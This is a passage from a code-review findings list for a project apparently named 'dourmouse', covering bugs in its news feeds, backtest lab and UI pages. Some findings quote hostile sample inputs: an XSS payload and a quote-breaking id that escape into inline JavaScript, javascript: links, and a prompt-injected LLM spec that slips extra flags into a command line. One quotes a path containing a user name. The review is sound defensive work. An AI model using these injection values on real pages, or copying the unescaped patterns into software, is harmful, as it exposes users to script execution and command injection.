- fix: default the outbox under user_config_dir(), wire the module (or delete it), and only mark rows synced that the RPC reports as accepted.

### P5-62 [low] World brief says "No <channel> items this cycle" when the source reports items but none were passed
- where: dourmouse/world_brief.py:289-297
- problem: for an ok channel with `count > 0` but an empty/missing item list (items truncated or dropped upstream) the else branch emits `_empty_sentence`, claiming there were no items, which contradicts the source's own count that the module says it must stay honest to (docstring of _channel_sentence).
- evidence: `if count > 0 and real_items:` ... `else: empty_but_ok.append(_empty_sentence(chan))`
- scenario: the pulse reports quakes count=7 but items["quakes"] is empty: the brief says "No earthquakes items this cycle."
- fix: when count > 0 and no items, say "N items reported, details unavailable".

### P5-64 [low] ATLAS lab test runs leave per-run folders (with a hard-coded home path) in the source tree
- where: dourmouse/workspace/atlas_lab/tmp/run_*/ (harness.py + strategy_module.py in each; about 24 folders exist, only 8 are in the review list)
- problem: each run directory is created under the package's own workspace/ and never removed; every harness.py embeds the absolute path `/Users/aditagrawal/dourmouse-recon/dourmouse/workspace/atlas_lab/tmp/run_<id>` in sys.path.insert and all are byte-identical stubs (`run()` returns zeros, `_load` always raises "ATLAS_DATA_PATH is not set"). They leak a user name and machine layout if committed or bundled, and the harness catches every exception, prints "===ERROR===" and still exits 0, so a caller that checks only the exit status treats a failed backtest as success.
- evidence: `sys.path.insert(0, '/Users/aditagrawal/dourmouse-recon/dourmouse/workspace/atlas_lab/tmp/run_20260912_061539_277e90')`
- scenario: a tests/atlas_proposals run points at the real workspace; the folders accumulate across weeks and end up in a packaged build or a git add -A.
- fix: run tests with DOURMOUSE_WORKSPACE under tmp_path, delete the run dir in a finally, add workspace/ to .gitignore, and exit non-zero from the harness on error.

### P5-69 [low] One bad news edition aborts the whole news channel
- where: dourmouse/world_pulse.py:1321-1329
- problem: `_http_get` is inside try/except per edition, but `_rss_items(raw, 3, _pick_news)` is outside it and raises RuntimeError for unparseable RSS or an empty feed, so a single malformed/empty edition discards the items already gathered from the other editions (the channel goes OFFLINE).
- evidence: `for it in _rss_items(raw, 3, _pick_news):` outside the try
- scenario: Google News returns an empty APAC feed: WORLD and EUROPE headlines are thrown away too.
- fix: wrap the _rss_items call in the same try/except and record an "UNAVAILABLE" item.

### P5-7 [low] User-supplied pair is dead; LLM pair always wins, and LLM strategy_type/pair go unvalidated into CLI argv
- where: dourmouse/atlas/atlas_lab.py:775, 789, 793-795
- problem: prompt_to_strategy requires "pair" in the spec, so `spec.get("pair", req.pair)` never falls back to the pair the user posted to /api/atlas-lab/backtest. The LLM-controlled pair and strategy_type are passed straight to `atlas fx-research --pair/--strategy` with no allowlist (a value starting with "--" becomes an option, a non-str raises TypeError in subprocess).
- evidence: `pair = spec.get("pair", req.pair)`
- scenario: user asks for GBPUSD in the pair field with a vague prompt, LLM answers EURUSD, the backtest runs EURUSD and the report says so only in small print; a prompt-injected spec can smuggle extra CLI flags.
- fix: prefer req.pair when the user supplied one, validate pair against ^[A-Z]{6}$ and strategy_type against the schema enum.

### P5-70 [low] GDELT export is fetched over plain HTTP and unzipped without a size limit
- where: dourmouse/world_pulse.py:1129, 1162-1168 (and `_http_get_bytes` at 142-156)
- problem: lastupdate.txt and the export ZIP are fetched via http:// (no integrity), the download is read unbounded, and `zf.read(names[0])` decompresses the whole member into memory, so a tampered or oversized response (zip bomb) can exhaust memory in the server process that also serves chat. The export URL taken from lastupdate.txt is also followed without checking its host.
- evidence: `_GDELT_LASTUPDATE_URL = "http://data.gdeltproject.org/gdeltv2/lastupdate.txt"` / `csv_text = zf.read(names[0]).decode(...)`
- scenario: a hostile network (café Wi-Fi) rewrites the plain-HTTP response to a zip bomb or an internal URL.
- fix: use https, cap the download and the member's file_size before reading, and require the export host to match data.gdeltproject.org.

### P5-8 [low] Merge-order comment contradicts code: strict battery overrides catalog rows
- where: dourmouse/atlas/atlas_lab.py:467-475
- problem: comment says catalog/locked rows "must win the merge", but dict.update with the strict batteries last means the batteries overwrite them (including the catalog's descriptions).
- evidence: `strategies.update(_parse_strict_battery(STRICT_BATTERY_PATH))`
- scenario: a strategy present in both shows the battery's sparse description and the battery verdict instead of the catalog entry.
- fix: parse batteries first and catalog last, or use setdefault for the batteries.

### P5-9 [low] _build_report JSON extraction stops at the first "{" line and swallows the failure
- where: dourmouse/atlas/atlas_lab.py:860-868
- problem: it takes everything from the first line beginning with "{" to the end of stdout; trailing text or an earlier JSON log line makes json.loads raise, the `break` is never reached, later candidates are never tried, and the result is verdict HOLD with all-None metrics and exit code 0, indistinguishable from a real hold.
- evidence: `candidate = "\n".join(lines[i:])`
- scenario: fx-research prints a progress line like `{"stage": ...}` before its result, or a trailing summary after it: the run is reported as "HOLD, more observation needed" with empty metrics.
- fix: use json.JSONDecoder().raw_decode from each "{" candidate and surface a "could not parse output" verdict when nothing parses.

### U1-10 [low] SETUP continues with an NVIDIA key that was edited after it was validated
- where: ui/setup.html:421
- problem: keyOk is set true by checkKey() and never reset. finish() saves the CURRENT contents of #nvKey, so the "Continue is enabled only when the chosen path is proven to work" guarantee (comment above refresh()) does not hold. The node path has the opposite mismatch: nodeUrlOk is saved, not what the field now shows.
- evidence: `values.NVIDIA_API_KEY = $("nvKey").value.trim(); }`
- scenario: user pastes a good key, presses Check key (green), then fixes a typo or pastes a different key; Continue stays enabled and the unvalidated key is written to the config file, producing the silent-dead-app the page claims to prevent. For a node, editing the address after Test still saves the old address while the field shows the new one.
- fix: clear keyOk/nodeOk (and call refresh()) on 'input' of #nvKey and #nodeUrl.

### U1-12 [low] HUB health dots show green for any HTTP answer, including 401 and 500
- where: ui/hub.html:175
- problem: health() marks ATLAS and FEED "ok" whenever fetch() resolves; it never checks r.ok, and fetch only rejects on network failure.
- evidence: `try { await fetch(ENGINE + "/api/health", {headers: EH}); set("hAtlas", true); }`
- scenario: wrong or missing engine token makes every engine call return 401, yet the ATLAS dot is cyan "ok"; loadKeys then dies and prints "engine unreachable", contradicting the dot.
- fix: set the dot from r.ok.

### U1-13 [low] PRODUCT page escapes only & < > but puts values into attributes, inline JS and unescaped template slots
- where: ui/product.html:230
- problem: renderCard builds onclick="approve(this,'${esc(c.id)}')" from decision_cards.json; esc() does not escape ' or ", so an id containing a quote leaves the JS string / attribute. Also `${label}` (raw c.outcome when it is not in STATE_LABEL), `${cls}` and `${top.p_value}` are inserted into innerHTML with no esc().
- evidence: `<button class="approve" onclick="approve(this,'${esc(c.id)}')">APPROVE</button>`
- scenario: a decision card written (by the generator script or anyone who can write decision_cards.json) with outcome `<img src=x onerror=...>` or id `x');...//` executes script in the product page that is iframed in the hub, which also holds the engine token.
- fix: escape quotes in esc(), build the buttons with addEventListener and dataset instead of inline handlers, and esc() label/p_value.

### U1-14 [low] PRODUCT page REJECT claims "Logged to the audit trail" but nothing is recorded
- where: ui/product.html:241
- problem: approve() and reject() only rewrite the DOM; no request is sent. reject() states the decision was logged, with no demo qualifier (approve() at least says "Demo only").
- evidence: `'<span style="color:var(--dead)">Logged to the audit trail.</span>'`
- scenario: a viewer rejects a pending decision card, sees "Logged to the audit trail", and believes a record exists; on reload the card is pending again and no audit entry was ever written.
- fix: send the decision to the server, or change the text to say nothing was recorded.

### U1-18 [low] HUD "DRIVE" button says it opens the ATLAS dashboard but navigates to a raw JSON endpoint
- where: ui/hud.html:464
- problem: the button's title is "ATLAS quant engine (opens dashboard)" and its handler does location.href = b.dataset.goto, which is /api/atlas. webui.py:3283 answers that path with atlas_panel_snapshot() JSON.
- evidence: `<button data-goto="/api/atlas" title="ATLAS quant engine (opens dashboard)" class="atlas">`
- scenario: clicking DRIVE replaces the HUD with a JSON blob (and no way back except the browser Back button), instead of a dashboard.
- fix: point it at a real HTML page (the shell's ATLAS screen, #/atlas) or drop the button.

### U1-2 [low] BROWSER mount consumes and acts on a pending pane request after the screen was disposed
- where: ui/assets/os/screens/browser/index.js:1513
- problem: mount awaits connectPane() and then unconditionally calls takePaneRequest() and openFromRequest(). If the user left BROWSER during that await, shutDown has already run (disposed = true, pane.hide() sent), but the inbox slot is still emptied and openWeb() still calls pane.navigate(url), which the file's own comment says causes the native view to show.
- evidence: `const waiting = takePaneRequest();`
- scenario: NEWS sends browser_pane_open, the shell routes to BROWSER, the user switches screens within the pane-state round trip. The request is lost for the next BROWSER visit and the BrowserView can be shown over the new screen (the defect the shutDown comment warns about).
- fix: after `await connectPane()` return early when `disposed`, before takePaneRequest, so the request stays queued.

### U1-22 [low] (legacy page) console.html copies code blocks with a trailing "COPY" line
- where: ui/console.html:2781
- problem: wireCopies() appends the COPY button as the LAST child of the <pre> (position:absolute, so it is block level) and copies `pre.innerText.replace(/^COPY\n?/, "")`, which only strips a leading "COPY". By the innerText algorithm the result ends with "\nCOPY". (Derived from the spec, not run in a browser.)
- evidence: `await navigator.clipboard.writeText(pre.innerText.replace(/^COPY\n?/,""))`
- scenario: copying a shell snippet and pasting it into a terminal runs an extra line `COPY`.
- fix: copy pre.querySelector('code').textContent.

### U1-23 [low] (legacy page) console.html queued directives run on whichever screen is open when they drain
- where: ui/console.html:2976-2979
- problem: submit() drains the queue of the screen it started on, but run() recomputes its target with threadKey(screen) at call time.
- evidence: `while(q.length){ const n=q.shift(); paintQueue(); await run(n); }`
- scenario: queue a message on RESEARCH while a turn runs, switch to NEWS; when the turn ends the queued RESEARCH text is sent into the NEWS thread with screen=NEWS (and show() jumps there).
- fix: pass the originating screen key into run().

### U1-24 [low] (legacy page) console.html SKIP CONFIRMATIONS (auto-approve) turns on with one click
- where: ui/console.html:5332-5345
- problem: the ON chip posts /api/settings/auto-approve immediately. The OS shell treats this as HIGH risk and puts a confirmation card in front of it.
- evidence: `body: JSON.stringify({enabled: val}),`
- scenario: a misclick next to the neighbouring GROUNDED MODE chips disables every approval prompt (file deletes, mail, privileged commands) until noticed.
- fix: ask first, as SETTINGS in the shell does.

### U1-25 [low] (legacy page) console.html puts feed-supplied links into href and window.open without checking the scheme
- where: ui/console.html:6227 (also 8070)
- problem: cardHTML() renders `<a href="${esc(p.link)}" target="_blank">` for world-map items and paintNews() calls window.open(it.link) for news items. esc() only escapes HTML; links come from external RSS/GDACS/GDELT feeds and neither news_stream.py nor world_pulse.py filters the scheme. The OS shell's atlas helpers.safeLink() allows only http(s).
- evidence: `if(p.link) parts.push(`<div><a href="${esc(p.link)}" target="_blank" rel="noopener">source</a></div>`);`
- scenario: a feed item with a javascript: or data: link becomes a clickable link in the console origin.
- fix: allow only /^https?:\/\//i before rendering or opening.

### U1-26 [low] (legacy page) console.html 3D editor keeps rendering, and can poll forever, while its screen is hidden or Three.js failed
- where: ui/console.html:8412 and 4616
- problem: the render loop stops only when the container leaves the DOM; switching to another console screen just hides the pane, so a WebGL render runs at display rate in the background. mountWhenReady() re-arms a 60 ms timeout until window.Design3D exists, forever if the module script failed to import.
- evidence: `if(!document.body.contains(container)){ disposeCurrent(); return; }`
- scenario: the owner opens DESIGN > 3D WORKSPACE once and moves on; the GPU keeps drawing. With the vendored three files missing, a 16 Hz timer runs for the life of the page.
- fix: also stop on pane hidden / document.hidden, and give mountWhenReady an attempt limit with a visible error.

### U1-27 [low] (legacy page) console.html boot readout writes node and model strings with innerHTML unescaped
- where: ui/console.html:2130-2133 and 2168
- problem: bootLines() interpolates b.model, s.node and s.detail into HTML and runBoot() assigns it with d.innerHTML; everywhere else in the file these values go through esc().
- evidence: `L.push(s.online ? `NODE  :: ${s.node} · ${s.detail || ""} <b>READY</b>``
- scenario: a compute node whose reported detail string contains markup injects it into the console at every boot.
- fix: esc() the interpolated values (the <b>/<span> wrappers stay literal).

### U1-4 [low] GOALS keeps the "Could not refresh" banner after the next poll succeeds
- where: ui/assets/os/screens/goals/index.js:92
- problem: load() clears st.error, then returns early when the board signature is unchanged and reason is 'poll', so paint() never runs and the .st-stale banner (and root data-state=stale) set by the failed poll is only removed inside paint().
- evidence: `if (sig === st.sig && reason === 'poll') return;`
- scenario: one failed 5 s poll (server restart, brief offline) shows "Could not refresh ... Showing the last read." The next poll succeeds with an identical board (the board response has no volatile field), so the warning stays until some goal or task actually changes, falsely telling the owner the data is stale.
- fix: when st.error was set before this load (or stale banner present), call paint() or states.clearStale(root) before the early return.

### U1-5 [low] RESEARCH "Live updates paused" banner is never cleared by a successful poll
- where: ui/assets/os/screens/research/index.js:375
- problem: pollLog() draws states.stale(qsEl, 'Live updates paused: ...') when a log read fails, but a later successful read only calls refreshAll() when new events arrived (n > 0). clearStale(qsEl) runs only inside loadQs().
- evidence: `if (n && !guard()) refreshAll();`
- scenario: one failed 10 s poll (server restart or brief offline) puts a "Live updates paused" banner on the questions list. When the log recovers with no new graph events the banner stays indefinitely although polling works again.
- fix: call states.clearStale(qsEl) on a successful readLog, regardless of the event count.

### U1-8 [low] VOICE header comment says unrecognised text is sent to the companion, the code deliberately never does
- where: ui/assets/os/screens/voice/index.js:7
- problem: the header states "Text the parser does not recognise is sent to the companion as an ordinary message, never dropped." planFor() (helpers.js F7) returns kind 'unknown' for such text, handleUtterance sends nothing, and the UI copy says "Nothing was sent."
- evidence: `recognise is sent to the companion as an ordinary message, never dropped.`
- scenario: a maintainer who trusts the comment (or the screen contract it documents) re-adds the chat fallback and silently spends model credit on every misheard phrase, the exact regression F7 removed.
- fix: update the comment to describe the SEND TO HOME opt-in.
